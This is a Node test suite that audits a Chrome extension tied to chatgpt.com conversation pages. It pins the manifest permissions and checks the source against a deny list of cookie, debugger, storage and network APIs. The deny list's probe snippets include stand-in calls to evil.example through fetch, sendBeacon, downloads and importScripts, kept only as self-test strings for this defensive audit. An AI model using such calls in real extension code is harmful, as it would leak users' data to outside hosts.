import assert from 'node:assert/strict';
import { readdir, readFile } from 'node:fs/promises';
import test from 'node:test';

const extension = new URL('../extension/', import.meta.url);

async function source(name) {
  return readFile(new URL(name, extension), 'utf8');
}

async function sourceFiles() {
  const entries = await readdir(extension);
  return entries.filter((name) => name.endsWith('.js') || name.endsWith('.mjs'));
}

async function combinedSource() {
  return Promise.all((await sourceFiles()).map(source)).then((parts) => parts.join('\n'));
}

// Every surface the extension must never touch. Each entry carries a probe:
// a concrete snippet that the matcher must flag, so a future matcher edit
// cannot silently stop matching a banned surface.
const FORBIDDEN_IN_SOURCE = [
  { label: 'tabs.update', pattern: /tabs\.update/, probe: 'chrome.tabs.update(1, { active: true });' },
  { label: 'tabs.create', pattern: /tabs\.create/, probe: "chrome.tabs.create({ url: 'https://evil.example' });" },
  { label: 'tabs.reload', pattern: /tabs\.reload/, probe: 'chrome.tabs.reload();' },
  { label: 'tabs.highlight', pattern: /tabs\.highlight/, probe: 'chrome.tabs.highlight({ tabs: 0 });' },
  { label: 'tabs.move', pattern: /tabs\.move/, probe: 'chrome.tabs.move(1, { index: 0 });' },
  { label: 'chrome.windows', pattern: /chrome\.windows/, probe: "chrome.windows.create({ url: 'about:blank' });" },
  { label: 'windows.update', pattern: /windows\.update/, probe: 'const { windows } = chrome; windows.update(1, { focused: true });' },
  { label: 'windows.create', pattern: /windows\.create/, probe: 'const { windows } = chrome; windows.create({});' },
  { label: 'chrome.cookies', pattern: /chrome\.cookies/, probe: 'chrome.cookies.getAll({});' },
  { label: 'document.cookie', pattern: /document\.cookie/, probe: 'void document.cookie;' },
  { label: 'active-tab query', pattern: /active\s*:\s*true/, probe: 'chrome.tabs.query({ active: true });' },
  { label: 'chrome.debugger', pattern: /chrome\.debugger/, probe: "chrome.debugger.attach({ tabId: 1 }, '1.3');" },
  { label: 'chrome.storage', pattern: /chrome\.storage/, probe: 'chrome.storage.local.set({ a: 1 });' },
  { label: 'chrome.downloads', pattern: /chrome\.downloads/, probe: "chrome.downloads.download({ url: 'https://evil.example/x' });" },
  { label: 'chrome.webRequest', pattern: /chrome\.webRequest/, probe: 'chrome.webRequest.onBeforeRequest.addListener(() => {});' },
  { label: 'chrome.declarative', pattern: /chrome\.declarative/, probe: 'chrome.declarativeNetRequest.updateDynamicRules({});' },
  { label: 'fetch(', pattern: /fetch\s*\(/, probe: "fetch('https://evil.example');" },
  { label: 'XMLHttpRequest', pattern: /XMLHttpRequest/, probe: 'new XMLHttpRequest();' },
  { label: 'WebSocket(', pattern: /WebSocket\s*\(/, probe: "new WebSocket('wss://evil.example');" },
  { label: 'EventSource(', pattern: /EventSource\s*\(/, probe: "new EventSource('https://evil.example/sse');" },
  { label: 'sendBeacon', pattern: /sendBeacon/, probe: "navigator.sendBeacon('https://evil.example', data);" },
  { label: 'importScripts(', pattern: /importScripts\s*\(/, probe: "importScripts('https://evil.example/x.js');" },
];

function findForbidden(sourceText) {
  return FORBIDDEN_IN_SOURCE.filter(({ pattern }) => pattern.test(sourceText)).map(({ label }) => label);
}

test('ships an MV3 extension with a same-origin SPA receiver and narrow F247 Native Messaging surface', async () => {
  const manifest = JSON.parse(await source('manifest.json'));

  assert.equal(manifest.manifest_version, 3);
  assert.deepEqual(manifest.permissions, ['nativeMessaging', 'tabs', 'scripting', 'alarms']);
  assert.deepEqual(manifest.host_permissions, ['https://chatgpt.com/c/*']);
  assert.deepEqual(manifest.content_scripts, [
    {
      matches: ['https://chatgpt.com/c/*'],
      js: ['content-script.js'],
      run_at: 'document_idle',
    },
  ]);
  assert.equal(manifest.background.service_worker, 'service-worker.js');
});

test('manifest exposes no web-accessible surface and no <all_urls> anywhere', async () => {
  const manifestText = await source('manifest.json');
  const manifest = JSON.parse(manifestText);

  assert.equal(manifest.web_accessible_resources, undefined);
  assert.doesNotMatch(manifestText, /<all_urls>/);
});

test('extension source has no focus, navigation, cookie, debugger, private API, storage, or network escape hatch', async () => {
  const findings = findForbidden(await combinedSource());
  assert.deepEqual(findings, []);
});

test('content script and extension source never use dynamic import to bypass review', async () => {
  const contentScript = await source('content-script.js');
  assert.doesNotMatch(contentScript, /\bimport\s*\(/);
  assert.doesNotMatch(await combinedSource(), /\bimport\s*\(/);
});

test('chrome.scripting reaches only executeScript, exactly once, in the pinned files shape', async () => {
  const combined = await combinedSource();

  const members = [
    ...combined.matchAll(/chrome\.scripting\s*(?:\?\.|\.)\s*([A-Za-z_$][\w$]*)/g),
    ...combined.matchAll(/chrome\.scripting\s*\[\s*['"]([^'"]+)['"]/g),
  ].map((match) => match[1]);
  assert.ok(members.length > 0, 'expected chrome.scripting usage to pin down');
  for (const member of members) {
    assert.equal(member, 'executeScript', `forbidden chrome.scripting.${member}`);
  }

  const calls = combined.match(/executeScript\s*\(/g) ?? [];
  assert.equal(calls.length, 1, 'executeScript( must appear exactly once across extension source');
  assert.doesNotMatch(combined, /\bfunc\s*:/);
  assert.doesNotMatch(combined, /\bargs\s*:/);

  const serviceWorker = await source('service-worker.js');
  assert.match(serviceWorker, /chrome\.scripting\.executeScript\(\{ target: \{ tabId \}, files: \['content-script\.js'\] \}\)/);
  assert.match(serviceWorker, /chrome\.tabs\.query\(\{ url: `https:\/\/chatgpt\.com\/c\/\$\{conversationId\}\*` \}\)/);
  assert.match(serviceWorker, /chrome\.tabs\.sendMessage\(tabId, request\)/);
});

test('audit matcher flags every forbidden surface (anti-staleness self-test)', () => {
  for (const { label, pattern, probe } of FORBIDDEN_IN_SOURCE) {
    assert.ok(pattern.test(probe), `${label}: probe does not even match its own pattern`);
    const findings = findForbidden(`const benign = 1;\n${probe}\n`);
    assert.ok(findings.includes(label), `${label}: probe not flagged: ${probe}`);
  }
});
